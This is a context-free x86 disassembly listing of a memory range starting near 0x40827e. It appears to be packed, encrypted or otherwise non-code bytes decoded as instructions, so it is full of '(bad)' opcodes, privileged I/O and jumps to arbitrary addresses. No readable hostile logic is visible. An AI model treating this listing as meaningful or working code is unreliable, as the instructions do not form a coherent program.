  40827e:	inc    esi
  40827f:	cmp    eax,0x90e6709d
  408284:	sbb    DWORD PTR [ecx+0x16],edx
  408287:	lock arpl WORD PTR [eax],bp
  40828a:	jae    0x408241
  40828c:	sbb    DWORD PTR [ebx-0x31],esp
  40828f:	mov    esi,0x9b623819
  408294:	sbb    DWORD PTR [ebx-0x45590ed8],ebp
  40829a:	daa    
  40829b:	pop    ecx
  40829c:	pop    esi
  40829d:	je     0x4082db
  40829f:	jne    0x4082db
  4082a1:	std    
  4082a2:	loop   0x408296
  4082a4:	(bad)  
  4082a5:	and    ebp,ebp
  4082a7:	mov    bl,0x69
  4082a9:	xchg   esp,eax
  4082aa:	cdq    
  4082ab:	scas   eax,DWORD PTR es:[edi]
  4082ac:	nop
  4082ad:	add    bh,BYTE PTR [edx]
  4082af:	mov    ds:0xc229e06d,eax
  4082b4:	add    eax,0xf22cc8b6
  4082b9:	xchg   edi,eax
  4082ba:	dec    ecx
  4082bb:	xchg   edx,eax
  4082bc:	jnp    0x4082de
  4082be:	jmp    0x4082b9
  4082c0:	bound  ecx,QWORD PTR [ebx-0x5bfcd544]
  4082c6:	cwde   
  4082c7:	push   es
  4082c8:	stc    
  4082c9:	cmp    ebx,eax
  4082cb:	repnz pusha 
  4082cd:	es dec ecx
  4082cf:	jb     0x408320
  4082d1:	ds cdq 
  4082d3:	leave  
  4082d4:	(bad)  
  4082d5:	lods   eax,DWORD PTR ds:[esi]
  4082d6:	fisttp QWORD PTR [edi+0x14]
  4082d9:	adc    DWORD PTR [esi],eax
  4082db:	stos   BYTE PTR es:[edi],al
  4082dc:	fdiv   QWORD PTR [ebx+0x5e]
  4082df:	clc    
  4082e0:	lods   al,BYTE PTR ds:[esi]
  4082e1:	mov    bl,0x66
  4082e3:	in     eax,dx
  4082e4:	jle    0x40830d
  4082e6:	bound  edx,QWORD PTR [ebx-0x20]
  4082e9:	aaa    
  4082ea:	push   edi
  4082eb:	add    al,0x8d
  4082ed:	pop    es
  4082ee:	inc    esi
  4082ef:	lea    eax,ds:0x6fc66c0a
  4082f5:	inc    ecx
  4082f6:	in     eax,dx
  4082f7:	out    0x94,al
  4082f9:	lahf   
  4082fa:	xor    ch,BYTE PTR [esi]
  4082fc:	(bad)  
  4082fe:	jge    0x40837b
  408300:	dec    ebp
  408301:	adc    DWORD PTR [ecx],0x16
  408304:	lods   al,BYTE PTR ds:[esi]
  408305:	bound  edi,QWORD PTR [eax+0x1a50cfdd]
  40830b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40830c:	mov    dl,0xe7
  40830e:	adc    ebx,edx
  408310:	jle    0x40838e
  408312:	sub    BYTE PTR [esp+ebx*1],bl
  408315:	ret    
  408316:	scas   al,BYTE PTR es:[edi]
  408317:	dec    ebp
  408318:	in     eax,dx
  408319:	test   esp,0x373cb017
  40831f:	jp     0x40835c
  408321:	aaa    
  408322:	(bad)  [ebx+0x3f046554]
  408328:	add    eax,0x1b6a0f53
  40832d:	mov    edi,0x7a465c67
  408332:	sti    
  408333:	in     al,dx
  408334:	push   cs
  408335:	jae    0x40837e
  408337:	xor    al,0x7f
  408339:	stc    
  40833a:	lods   al,BYTE PTR ds:[esi]
  40833b:	cmp    cl,BYTE PTR [ecx]
  40833d:	loopne 0x4083a0
  40833f:	outs   dx,BYTE PTR ds:[esi]
  408340:	xchg   ecx,eax
  408341:	sbb    dh,BYTE PTR [edi+0xda0a307]
  408347:	xchg   ecx,eax
  408348:	xchg   ebx,eax
  408349:	sahf   
  40834a:	cld    
  40834b:	ja     0x408320
  40834d:	scas   al,BYTE PTR es:[edi]
  40834e:	fisttp DWORD PTR [ebp+edx*1-0x6de02ca5]
  408355:	fnstsw WORD PTR [ebx-0x7a]
  408358:	fisub  WORD PTR [esi]
  40835a:	arpl   WORD PTR [ebp+0x32],di
  40835d:	rol    BYTE PTR [ecx],cl
  40835f:	mov    edx,0xc78bad8e
  408364:	mov    esp,0xaf10e41f
  408369:	ins    BYTE PTR es:[edi],dx
  40836a:	aas    
  40836b:	cmp    eax,0xac299871
  408370:	lods   al,BYTE PTR ds:[esi]
  408371:	rcr    BYTE PTR [edi],1
  408373:	jmp    0xd9f6b895
  408378:	out    0xf6,eax
  40837a:	(bad)  
  40837b:	jb     0xc328b0a4
  408381:	push   edi
  408382:	dec    ebx
  408383:	sahf   
  408384:	pop    ds
  408385:	not    DWORD PTR [edx-0x4e652903]
  40838b:	sahf   
  40838c:	add    DWORD PTR [ebp+0x7],ebp
  40838f:	in     al,dx
  408390:	lock in eax,0x95
  408393:	mov    edx,0xc51ac14
  408398:	mov    esi,0x27c01619
  40839d:	lods   eax,DWORD PTR ds:[esi]
  40839e:	pop    esp
  40839f:	push   edx
  4083a0:	js     0x40841e
  4083a2:	hlt    
  4083a3:	ds add al,0x82
  4083a6:	pop    ds
  4083a7:	push   ecx
  4083a8:	(bad)  
  4083a9:	sbb    ebp,DWORD PTR [ebp-0x7f]
  4083ac:	sbb    eax,0xeebfe3b3
  4083b1:	pop    ds
  4083b2:	cmp    DWORD PTR [edx-0x31],0xffffffef
  4083b6:	jmp    0xdee2bc32
  4083bb:	add    eax,0x49c9954c
  4083c0:	icebp  
  4083c1:	pcmpeqw mm1,QWORD PTR [ecx+edi*2]
  4083c5:	es call 0xdc6d:0x72f5d92b
  4083cd:	pushf  
  4083ce:	js     0x40839f
  4083d0:	mov    BYTE PTR [edx+0x3a32c892],ah
  4083d6:	clc    
  4083d7:	and    dl,0xd9
  4083da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4083db:	push   eax
  4083dc:	adc    al,ch
  4083de:	push   ds
  4083df:	cdq    
  4083e0:	sub    eax,0xc8f43517
  4083e5:	xor    al,0xc0
  4083e7:	xchg   edi,eax
  4083e8:	cld    
  4083e9:	fwait
  4083ea:	xor    BYTE PTR [ebx-0x7595fbeb],0x21
  4083f1:	xor    BYTE PTR [ebx],0x6
  4083f4:	mov    WORD PTR [eax+0x424ed8f7],fs
  4083fa:	push   edx
  4083fb:	std    
  4083fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4083fd:	iret   
  4083fe:	jnp    0x408408
  408400:	js     0x408456
  408402:	push   ebx
  408403:	mov    ebp,0x34f03fa1
  408408:	and    cl,BYTE PTR [ebx]
  40840a:	fwait
  40840b:	xor    al,0x7c
  40840d:	adc    ah,BYTE PTR [esi-0x1d7178b1]
  408413:	add    DWORD PTR [ebp-0x6f],ebp
  408416:	push   esp
  408417:	adc    DWORD PTR [eax+ebp*4],edx
  40841a:	cmc    
  40841b:	jb     0x408409
  40841d:	sub    eax,0x9316cf60
  408422:	xchg   edx,eax
  408423:	lods   al,BYTE PTR ds:[esi]
  408424:	sub    BYTE PTR [bp+0x2006],ch
  408429:	pop    edi
  40842a:	xchg   ah,bl
  40842c:	(bad)
  40842f:	push   ss
  408430:	and    eax,0x6e69023f
  408435:	add    al,al
  408437:	fild   DWORD PTR [ecx]
  408439:	scas   eax,DWORD PTR es:[edi]
  40843a:	sub    DWORD PTR [ebp+0x63],0x7b5fc79a
  408441:	das    
  408442:	pop    eax
  408443:	jge    0x40841a
  408445:	inc    eax
  408446:	lahf   
  408447:	sub    BYTE PTR [eax],bh
  408449:	in     al,0x1c
  40844b:	outs   dx,DWORD PTR ds:[esi]
  40844c:	inc    ebx
  40844d:	popa   
  40844e:	adc    bh,bh
  408450:	push   0xffffffa4
  408452:	out    dx,al
  408453:	mov    BYTE PTR [ebx-0xf],bh
  408456:	and    BYTE PTR [edi-0xe],ch
  408459:	ins    DWORD PTR es:[edi],dx
  40845a:	or     eax,0xffa389bb
  40845f:	dec    ebp
  408460:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408461:	in     al,dx
  408462:	in     eax,dx
  408463:	push   ss
  408464:	jmp    0x5665:0x3af04fd3
  40846b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40846c:	inc    edx
  40846d:	cmp    DWORD PTR [edx],edi
  40846f:	in     eax,dx
  408470:	mov    ch,BYTE PTR [edi+edx*2]
  408473:	cmp    eax,0xc325c66a
  408478:	inc    edi
  408479:	rcl    BYTE PTR [ecx],1
  40847b:	cmp    al,BYTE PTR [ebx-0x19]
  40847e:	idiv   BYTE PTR [ecx+esi*2+0x2a4270b8]
  408485:	jecxz  0x4084df
  408487:	pushf  
  408488:	je     0x408461
  40848a:	xor    bl,BYTE PTR [ecx-0x2aec0b4d]
  408490:	(bad)  
  408491:	and    DWORD PTR [edi],esi
  408493:	mov    edx,0x1354544
  408498:	scas   eax,DWORD PTR es:[edi]
  408499:	inc    edx
  40849a:	cli    
  40849b:	add    esi,ebp
  40849d:	push   edx
  40849e:	(bad)  
  40849f:	les    edx,FWORD PTR [eax-0x4e]
  4084a2:	mov    al,ds:0x37c5fa96
  4084a7:	mov    cl,0x54
  4084a9:	jo     0x40850b
  4084ab:	or     al,0x15
  4084ad:	data16 ins BYTE PTR es:[edi],dx
  4084af:	nop
  4084b0:	pop    edi
  4084b1:	sub    BYTE PTR [edi+0xd76ab2a],dh
  4084b7:	push   eax
  4084b8:	mov    cl,0x55
  4084ba:	adc    DWORD PTR [ecx+0x79],esi
  4084bd:	pop    esp
  4084be:	sub    dh,bh
  4084c0:	inc    ebp
  4084c1:	repz pop ebp
  4084c3:	(bad)  
  4084c4:	mov    esi,0xe105fe7a
  4084c9:	es push esi
  4084cb:	jmp    0xeb54:0x56d92758
  4084d2:	ret    
  4084d3:	clc    
  4084d4:	fcomp  DWORD PTR [ebx]
  4084d6:	ins    BYTE PTR es:[edi],dx
  4084d7:	jp     0x408549
  4084d9:	push   ds
  4084da:	cmp    esp,DWORD PTR [esi+0x7dbeb2ad]
  4084e0:	mov    cl,0xb7
  4084e2:	int3   
  4084e3:	mov    dl,0x53
  4084e5:	push   ds
  4084e6:	xor    DWORD PTR [ebx],edx
  4084e8:	xlat   BYTE PTR ds:[ebx]
  4084e9:	(bad)  
  4084ea:	out    dx,al
  4084eb:	retf   
  4084ec:	aad    0x79
  4084ee:	pusha  
  4084ef:	into   
  4084f0:	push   0xda2df0b8
  4084f5:	sub    eax,0xd27323a5
  4084fa:	and    al,0x3e
  4084fc:	ror    DWORD PTR [edx],1
  4084fe:	sbb    ebx,esp
  408500:	pop    esi
  408501:	ret    
  408502:	xlat   BYTE PTR ds:[ebx]
  408503:	jge    0x4084b9
  408505:	mov    DWORD PTR [edi+0x2f],0xfa9c05e1
  40850c:	push   esp
  40850d:	xor    esi,DWORD PTR [edi+eiz*4-0x3d]
  408511:	mov    dh,0x5d
  408513:	add    BYTE PTR [ecx+0x573ceae0],0x5d
  40851a:	fld    DWORD PTR [ecx-0x5370f194]
  408520:	jl     0x408514
  408522:	push   edx
  408523:	push   edi
  408524:	mov    bh,BYTE PTR [ebx+0x63d7e32f]
  40852a:	call   0x6c030682
  40852f:	mov    dl,0x39
  408531:	rcl    DWORD PTR [edi],1
  408533:	jnp    0x408583
  408535:	jmp    0xa530f1f3
  40853a:	cli    
  40853b:	in     eax,dx
  40853c:	sbb    DWORD PTR [ecx+0x32],eax
  40853f:	mov    bh,bh
  408541:	in     eax,0xdd
  408543:	cs int3 
  408545:	mov    ds,WORD PTR [ebx-0x3c]
  408548:	jae    0x40851f
  40854a:	lods   al,BYTE PTR ds:[esi]
  40854b:	xchg   ebp,eax
  40854c:	adc    DWORD PTR [eax+0x68cd428b],0xffffffa3
  408553:	test   eax,0x2ed00406
  408558:	aam    0x71
  40855a:	xchg   ecx,eax
  40855b:	enter  0x4ef2,0x1b
  40855f:	shl    BYTE PTR [ebp+0x2b],1
  408562:	or     eax,0x995e29ab
  408567:	xchg   ebp,eax
  408568:	dec    esp
  408569:	enter  0xb2fc,0x32
  40856d:	jle    0x4084fa
  40856f:	mov    esp,0xb9091fa2
  408574:	xor    cl,BYTE PTR [eax+ebx*2+0x37]
  408578:	xchg   esp,eax
  408579:	jo     0x4085c6
  40857b:	outs   dx,BYTE PTR ds:[esi]
  40857c:	push   cs
  40857d:	or     BYTE PTR [edx+ecx*8+0x4],bl
  408581:	jge    0x4085b1
  408583:	scas   al,BYTE PTR es:[edi]
  408584:	xchg   edi,eax
  408585:	fs pop edx
  408587:	shl    DWORD PTR [esi+0x28],cl
  40858a:	sub    eax,0x1f5fcf60
  40858f:	push   esp
  408590:	fld    DWORD PTR [ebx-0x2f]
  408593:	icebp  
  408594:	test   BYTE PTR [edi],0x18
  408597:	mov    bh,0x99
  408599:	dec    eax
  40859a:	mov    ds:0x1f6c8511,al
  40859f:	mov    bl,0x34
  4085a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4085a2:	dec    edx
  4085a3:	fnstsw WORD PTR [ebx+0x7cef7dc5]
  4085a9:	ds repz jl 0x4085ae
  4085ad:	je     0x408613
  4085af:	adc    BYTE PTR [esp+edi*4-0x53],0xa4
  4085b4:	pop    es
  4085b5:	adc    al,0x56
  4085b7:	les    esp,FWORD PTR [esp+ecx*8]
  4085ba:	sbb    esp,DWORD PTR [edx]
  4085bc:	in     eax,0xd5
  4085be:	jle    0x4085c0
  4085c0:	das    
  4085c1:	xchg   ebx,eax
  4085c2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4085c3:	pushf  
  4085c4:	out    dx,al
  4085c5:	sbb    bl,BYTE PTR [edi+0x58]
  4085c8:	push   0x5
  4085ca:	imul   ebx,ebp,0x5bf74087
  4085d0:	es or  esp,ebp
  4085d3:	mov    al,0xb9
  4085d5:	in     al,dx
  4085d6:	xor    eax,0x1525fa8a
  4085db:	jmp    0x4085cf
  4085dd:	and    eax,0xd10a0541
  4085e2:	pop    es
  4085e3:	dec    ebx
  4085e4:	pop    ebp
  4085e5:	daa    
  4085e6:	fimul  DWORD PTR [ecx+edi*4+0x7ca0e977]
  4085ed:	add    BYTE PTR [ecx],dl
  4085ef:	mov    ds:0x9f07768b,eax
  4085f4:	aaa    
  4085f5:	mov    dl,0xc7
  4085f7:	push   esp
  4085f8:	and    DWORD PTR [ebx-0x4b285af1],esi
  4085fe:	mov    ah,BYTE PTR [esi-0x53]
  408601:	jbe    0x40866b
  408603:	scas   al,BYTE PTR es:[edi]
  408604:	fiadd  WORD PTR [ebx]
  408606:	push   0x2c
  408608:	mov    ecx,0xa55280db
  40860d:	sbb    ch,dh
  40860f:	hlt    
  408610:	cmp    esi,DWORD PTR [eax-0x18]
  408613:	xor    dh,ah
  408615:	jmp    0xa3b0:0xd159fbe
  40861c:	pop    eax
  40861d:	cld    
  40861e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40861f:	ret    
  408620:	popf   
  408621:	mov    cl,0x41
  408623:	arpl   WORD PTR [eax],di
  408625:	call   0x7fe7c659
  40862a:	mul    BYTE PTR [esi]
  40862c:	(bad)  
  40862d:	cli    
  40862e:	fs sbb ah,ah
  408631:	mov    al,ds:0x9103f22d
  408636:	and    ebp,DWORD PTR [esi]
  408638:	call   0x84c7:0x2f6f0932
  40863f:	pop    ecx
  408640:	jge    0x40863d
  408642:	rcr    BYTE PTR ds:0xaf086604,1
  408648:	xor    DWORD PTR [esi],ebp
  40864a:	hlt    
  40864b:	push   ecx
  40864c:	jle    0x408652
  40864e:	or     DWORD PTR [ebp+0x70],edi
  408651:	loope  0x4085ff
  408653:	ds pop edx
  408655:	sbb    DWORD PTR [ebp-0x19],edi
  408658:	lea    eax,[edx+edi*8+0x18c3a129]
  40865f:	out    0x53,al
  408661:	cmp    DWORD PTR [edi+0x7aa78545],edi
  408667:	std    
  408668:	pop    ecx
  408669:	mov    eax,ds:0x93e8d2fa
  40866e:	mov    bh,0x89
  408670:	out    dx,al
  408671:	in     al,0x7f
  408673:	inc    edx
  408674:	mov    bh,ah
  408676:	retf   
  408677:	jp     0x408646
  408679:	test   BYTE PTR [ebx],al
  40867b:	jle    0x40864d
  40867d:	pop    edx
  40867e:	pop    eax
  40867f:	int    0xcf
  408681:	pop    ebp
  408682:	dec    ebp
  408683:	data16 ja 0x40865b
  408686:	mov    cl,0x11
  408688:	inc    esp
  408689:	fcmovnu st,st(5)
  40868b:	fnstcw WORD PTR [eax]
  40868d:	inc    ebx
  40868e:	cmp    cl,BYTE PTR [edx]
  408690:	pop    eax
  408691:	jnp    0x408671
  408693:	add    esp,DWORD PTR [eax]
  408695:	leave  
  408696:	daa    
  408697:	hlt    
  408698:	jnp    0x408689
  40869a:	xor    ecx,DWORD PTR [esi+0x23122718]
  4086a0:	test   BYTE PTR [edx-0x42],bl
  4086a3:	xchg   esi,eax
  4086a4:	mov    ds:0x4766a93,al
  4086a9:	hlt    
  4086aa:	mov    dl,0xf6
  4086ac:	dec    ebp
  4086ad:	add    eax,0xeac4f0c2
  4086b2:	xlat   BYTE PTR ds:[ebx]
  4086b3:	xor    eax,0xc6fbbb43
  4086b8:	jecxz  0x4086f8
  4086ba:	jnp    0x4086cc
  4086bc:	cmc    
  4086bd:	xchg   ebp,eax
  4086be:	mov    esp,ss
  4086c0:	shr    BYTE PTR [ebx],cl
  4086c2:	push   eax
  4086c3:	pushf  
  4086c4:	in     al,0x63
  4086c6:	in     eax,dx
  4086c7:	js     0x408660
  4086c9:	jnp    0x4086b4
  4086cb:	pushf  
  4086cc:	mov    bl,0xc0
  4086ce:	mov    ds:0x24e6f983,eax
  4086d3:	fimul  DWORD PTR [edx]
  4086d5:	std    
  4086d6:	add    edi,DWORD PTR [ecx-0x3d8d43b6]
  4086dc:	or     BYTE PTR [ecx],al
  4086de:	pusha  
  4086df:	xchg   BYTE PTR [edi],ah
  4086e1:	pop    ebp
  4086e2:	xlat   BYTE PTR ds:[ebx]
  4086e3:	test   eax,0x4000a87
  4086e8:	push   eax
  4086e9:	call   0x2a02ee18
  4086ee:	bound  ebp,QWORD PTR [eax]
  4086f0:	adc    DWORD PTR [ecx+eax*1],ebx
  4086f3:	dec    edx
  4086f4:	xor    al,0x50
  4086f6:	inc    esi
  4086f7:	adc    al,0x61
  4086f9:	scas   eax,DWORD PTR es:[edi]
  4086fa:	je     0x4086c8
  4086fc:	pop    ecx
  4086fd:	xor    edi,esp
  4086ff:	inc    esi
  408700:	mul    edi
  408702:	add    esi,edx
  408704:	ins    BYTE PTR es:[edi],dx
  408705:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408706:	pushw  ds
  408708:	mov    cs,WORD PTR [edx+0x22]
  40870b:	jmp    0x8d97:0xe481020b
  408712:	fisubr WORD PTR [ebx+0x1a9ffbc2]
  408718:	xchg   ebp,eax
  408719:	test   DWORD PTR [ecx+0x43],eax
  40871c:	fst    DWORD PTR [edi+0x78]
  40871f:	std    
  408720:	or     al,0x5
  408722:	out    dx,eax
  408723:	in     eax,0x3c
  408725:	add    ch,BYTE PTR [edx+ebp*8-0x495549e9]
  40872c:	mov    edi,0xa30ae55e
  408731:	in     al,0x95
  408733:	arpl   WORD PTR [edx+0x67],cx
  408736:	in     eax,dx
  408737:	out    0x8f,eax
  408739:	scas   al,BYTE PTR es:[edi]
  40873a:	inc    esi
  40873b:	sub    DWORD PTR [eax+0x6ee0f9e1],0xffffffe1
  408742:	jns    0x4086c6
  408744:	sbb    ah,BYTE PTR [edi]
  408746:	imul   eax,DWORD PTR [edi+0xb],0x52
  40874a:	jb     0x408761
  40874c:	push   0xd179502e
  408751:	std    
  408752:	(bad)  
  408753:	jo     0x4087a7
  408755:	ret    0xa6fc
  408758:	stc    
  408759:	xor    eax,0x1885d28
  40875e:	popw   ds
  408760:	mov    ch,0x23
  408762:	ins    DWORD PTR es:[edi],dx
  408763:	stos   BYTE PTR es:[edi],al
  408764:	push   esp
  408765:	daa    
  408766:	sub    eax,0x6bdc1d94
  40876b:	mov    ebx,ebx
  40876d:	dec    ebp
  40876e:	jg     0x4087ec
  408770:	(bad)  
  408771:	fdivr  QWORD PTR [eax+ebp*4-0x5c]
  408775:	sti    
  408776:	xchg   ebp,eax
  408777:	sbb    edx,DWORD PTR [eax-0x68]
  40877a:	lock test al,0x3
  40877d:	sub    al,0x8
  40877f:	std    
  408780:	popa   
  408781:	sub    al,0x8
  408783:	cmp    ebx,DWORD PTR [esi+0x5f]
  408786:	push   esp
  408787:	inc    ecx
  408788:	pop    ecx
  408789:	loop   0x4087a7
  40878b:	jecxz  0x4087dc
  40878d:	fsub   st(7),st
  40878f:	sti    
  408790:	fbld   TBYTE PTR [ebx-0x8797023]
  408796:	jbe    0x4087e3
  408798:	xchg   esp,eax
  408799:	or     ch,BYTE PTR [edi+0xa]
  40879c:	fld    QWORD PTR [edx+0x38]
  40879f:	mov    eax,ds:0x61009f19
  4087a4:	dec    eax
  4087a5:	mov    esi,0x1aef2770
  4087aa:	cmp    al,0xe1
  4087ac:	(bad)
  4087af:	bound  eax,QWORD PTR [eax+ebp*8-0x395ae49b]
  4087b6:	jecxz  0x40877c
  4087b8:	pop    es
  4087b9:	jmp    0x40881c
  4087bb:	push   ss
  4087bc:	ret    0xcab6
  4087bf:	and    BYTE PTR ds:0x99adad96,al
  4087c5:	or     DWORD PTR [edx+ebx*8],edx
  4087c8:	dec    esi
  4087c9:	sbb    esp,DWORD PTR ds:[di]
  4087cd:	clc    
  4087ce:	cmp    ch,al
  4087d0:	push   ecx
  4087d1:	sub    al,0xc5
  4087d3:	retf   0x122b
  4087d6:	int3   
  4087d7:	ror    DWORD PTR [ecx],0x44
  4087da:	adc    DWORD PTR es:[esi+0xa],ebp
  4087de:	adc    edx,DWORD PTR cs:[ebx+esi*2+0x2ce5f003]
  4087e6:	add    eax,DWORD PTR [ebx]
  4087e8:	pop    eax
  4087e9:	lods   eax,DWORD PTR ds:[esi]
  4087ea:	mul    esp
  4087ec:	stos   DWORD PTR es:[edi],eax
  4087ed:	aas    
  4087ee:	into   
  4087ef:	loope  0x408827
  4087f1:	jmp    0x1d20f4da
  4087f6:	int3   
  4087f7:	into   
  4087f8:	(bad)  
  4087f9:	ins    DWORD PTR es:[edi],dx
  4087fa:	sub    esp,0x9241eacb
  408800:	sub    eax,DWORD PTR [esi+0x2]
  408803:	test   eax,0x371979bd
  408808:	sub    al,BYTE PTR [ebx+0x19]
  40880b:	or     al,dh
  40880d:	aas    
  40880e:	push   edi
  40880f:	xor    al,0x76
  408811:	or     BYTE PTR [eax],al
  408813:	inc    esp
  408814:	ret    
  408815:	pop    esi
  408816:	mov    ebp,fs
  408818:	outs   dx,DWORD PTR ds:[esi]
  408819:	sahf   
  40881a:	dec    ebp
  40881b:	outs   dx,DWORD PTR ds:[esi]
  40881c:	retf   
  40881d:	test   eax,0x9e3a4e3f
  408822:	or     DWORD PTR [ecx],eax
  408824:	jns    0x408815
  408826:	mov    ch,0xbe
  408828:	jns    0x408804
  40882a:	dec    esi
  40882b:	push   ds
  40882c:	mov    ecx,0x8d3f7afa
  408831:	fmul   QWORD PTR [ebx+0x61]
  408834:	cdq    
  408835:	sbb    al,0x79
  408837:	and    DWORD PTR [edx-0x79],edi
  40883a:	xor    cl,BYTE PTR ds:0x2332c5a
  408840:	adc    DWORD PTR [ebp+0x7c],eax
  408843:	mov    bh,0xc6
  408845:	xchg   edi,eax
  408846:	mov    edx,0xb136a793
  40884b:	adc    DWORD PTR [ecx],ebp
  40884d:	inc    edi
  40884e:	in     eax,0x40
  408850:	and    DWORD PTR [ebx-0x23],edi
  408853:	jmp    0xc8502f9f
  408858:	scas   eax,DWORD PTR es:[edi]
  408859:	push   edx
  40885a:	sbb    dh,BYTE PTR [edi+0x78]
  40885d:	or     eax,0xd03bb540
  408862:	call   DWORD PTR [edi+0x77]
  408865:	ret    0x14cf
  408868:	push   ebp
  408869:	jl     0x408862
  40886b:	data16 or dh,ah
  40886e:	lock mov edx,0xc4cc55ac
  408874:	adc    eax,0x8e655085
  408879:	xor    al,dl
  40887b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40887c:	mov    fs,WORD PTR [ebp+0xd]
  40887f:	fstp   QWORD PTR [eax]
  408881:	xor    eax,0x971ac4de
  408886:	pop    esp
  408887:	lea    ebx,[ecx]
  408889:	retf   0xd46a
  40888c:	rcr    DWORD PTR [edi-0x1f1a4a91],cl
  408892:	mov    bl,0x46
  408894:	sbb    dl,BYTE PTR ds:0x7ebe5dd5
  40889a:	dec    esp
  40889b:	popa   
  40889c:	push   ss
  40889d:	dec    ebx
  40889e:	jb     0x408887
  4088a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4088a1:	push   es
  4088a2:	dec    edi
  4088a3:	out    dx,eax
  4088a4:	int3   
  4088a5:	rcl    WORD PTR ds:[ecx],cl
  4088a9:	rcl    bh,0xb7
  4088ac:	cs bnd ret 
  4088af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4088b0:	lds    esp,FWORD PTR [ebx]
  4088b2:	(bad)  
  4088b3:	setbe  bh
  4088b6:	imul   ecx,DWORD PTR [si-0x23],0x1782593c
  4088be:	jo     0x408901
  4088c0:	jmp    0xa429:0x535b4d1e
  4088c7:	leave  
  4088c8:	xchg   DWORD PTR [edi],ecx
  4088ca:	(bad)  
  4088cb:	mov    esi,0xf7a8d17d
  4088d0:	push   0xffffffff
  4088d2:	fwait
  4088d3:	jno    0x4088ee
  4088d5:	scas   eax,DWORD PTR es:[edi]
  4088d6:	jne    0x408940
  4088d8:	loope  0x4088d6
  4088da:	pop    edx
  4088db:	push   cs
  4088dc:	jo     0x408945
  4088de:	ja     0x408941
  4088e0:	gs je  0x408907
  4088e3:	cmp    al,0xc5
  4088e5:	shl    DWORD PTR [eax-0x70],cl
  4088e8:	push   ebp
  4088e9:	sar    BYTE PTR [ebx],1
  4088eb:	xchg   edx,eax
  4088ec:	sub    al,0x2f
  4088ee:	iret   
  4088ef:	in     al,0xe6
  4088f1:	pop    esp
  4088f2:	sub    al,0x7
  4088f4:	imul   DWORD PTR [esp+edi*8]
  4088f7:	sub    bl,bh
  4088f9:	outs   dx,DWORD PTR ds:[esi]
  4088fa:	fcomp  st(7)
  4088fd:	mov    eax,ds:0xf1067f26
  408902:	mov    eax,ds:0x4716cf58
  408907:	dec    eax
  408908:	pop    ds
  408909:	adc    al,0x6f
  40890b:	mov    ecx,0xa80c9040
  408910:	xchg   esi,eax
  408911:	loop   0x408945
  408913:	pusha  
  408914:	dec    edi
  408915:	add    ah,BYTE PTR [ecx]
  408917:	int    0xe6
  408919:	(bad)
  40891c:	pop    ss
  40891d:	ins    BYTE PTR es:[edi],dx
  40891e:	gs sbb eax,0xe9a1e4ff
  408924:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408925:	push   0x64b67ad0
  40892a:	js     0x4088ee
  40892c:	retf   
  40892d:	scas   eax,DWORD PTR es:[edi]
  40892e:	xor    eax,0x6b1bc28b
  408933:	mov    edi,0xcb244d48
  408938:	sbb    eax,0x2cc7e6aa
  40893d:	call   0x1770:0x85f4b41b
  408944:	fldenv [ebx+0x3]
  408947:	popf   
  408948:	dec    esi
  408949:	hlt    
  40894a:	and    dh,al
  40894c:	and    BYTE PTR [ebx-0xee681fd],cl
  408952:	and    BYTE PTR [esi-0x373b06c6],dh
  408958:	and    al,BYTE PTR [ebp-0x28]
  40895b:	enter  0x7119,0xd6
  40895f:	dec    ebx
  408960:	cmp    al,0xd4
  408962:	mov    ebp,0x321bed71
  408967:	push   ebp
  408968:	ret    0xe29
  40896b:	pop    es
  40896c:	mov    eax,0x21abb93f
  408971:	into   
  408972:	(bad)  
  408973:	fs test al,0x1f
  408976:	(bad)
  40897a:	mov    ch,dl
  40897c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40897d:	loop   0x408992
  40897f:	adc    edi,ebx
  408981:	cmp    BYTE PTR [ebx+0x37],ch
  408984:	mov    bl,0xcb
  408986:	dec    eax
  408987:	cdq    
  408988:	push   ecx
  408989:	lds    ecx,FWORD PTR fs:[eax+0x59f3cd93]
  408990:	loop   0x4089ac
  408992:	jne    0x4089a9
  408994:	ja     0x408a06
  408996:	dec    esp
  408997:	cmp    BYTE PTR [edx-0x4f],bl
  40899a:	icebp  
  40899b:	add    DWORD PTR [esi+0x47],esi
  40899e:	outs   dx,BYTE PTR ds:[esi]
  40899f:	xor    ebx,DWORD PTR [edx-0x3a]
  4089a2:	cmp    ecx,DWORD PTR [esi+0x35]
  4089a5:	jae    0x40896a
  4089a7:	sbb    DWORD PTR [edi+eax*8],edi
  4089aa:	movaps XMMWORD PTR [ebp+0x4f2b5578],xmm7
  4089b1:	sub    DWORD PTR ds:0x83382e26,eax
  4089b7:	mov    ebx,0xd333e2a8
  4089bc:	retf   0xc9c5
  4089bf:	sub    al,0xc9
  4089c1:	js     0x4089d9
  4089c3:	adc    DWORD PTR [eax-0x74],ebx
  4089c6:	(bad)  
  4089c7:	lahf   
  4089c8:	mov    ebx,0x5fbf18af
  4089cd:	push   ds
  4089ce:	sbb    BYTE PTR [edx],dl
  4089d0:	dec    ebx
  4089d1:	test   al,0x5f
  4089d3:	lods   al,BYTE PTR ds:[esi]
  4089d4:	ins    BYTE PTR es:[edi],dx
  4089d5:	in     al,0x7
  4089d7:	jmp    0x23a5deeb
  4089dc:	mov    ecx,0x7afc28b8
  4089e1:	ror    DWORD PTR [ebp+0x3a13fb57],cl
  4089e7:	fs add cl,ah
  4089ea:	jge    0x408a1c
  4089ec:	lock xchg BYTE PTR [edx],al
  4089ef:	push   ds
  4089f0:	scas   al,BYTE PTR es:[edi]
  4089f1:	mov    al,0x3b
  4089f3:	dec    ecx
  4089f4:	jns    0x40898b
  4089f6:	bound  ebx,QWORD PTR [ecx+0x7d84c19a]
  4089fc:	addr16 xor eax,0xd8f2db6d
  408a02:	inc    esi
  408a03:	pop    edi
  408a04:	jae    0x408a10
